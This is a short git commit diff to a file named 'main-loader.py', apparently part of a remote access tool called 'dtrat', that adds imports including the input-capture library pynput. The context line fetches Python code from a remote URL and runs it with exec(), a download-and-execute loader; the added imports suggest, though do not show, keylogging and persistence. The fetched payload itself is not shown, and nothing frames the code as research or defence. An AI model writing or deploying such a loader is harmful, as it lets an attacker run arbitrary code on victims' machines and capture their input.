117f3a2631808b236cd0117599667b81d5e18f14
paledega <38860643+paledega@users.noreply.github.com>
2022-04-04 21:42:00 +0300

    Update main-loader.py

--- main-loader.py
+++ main-loader.py
@@ -5,5 +5,9 @@ import time
 import os, sys
 import platform
 import subprocess
+import shutil
+import pynput
+import multiprocessing
+
 
 exec(str(requests.get("https://dtrat.github.io/dtrat/main.py?q={}".format(time.time)).content.decode("utf-8")))
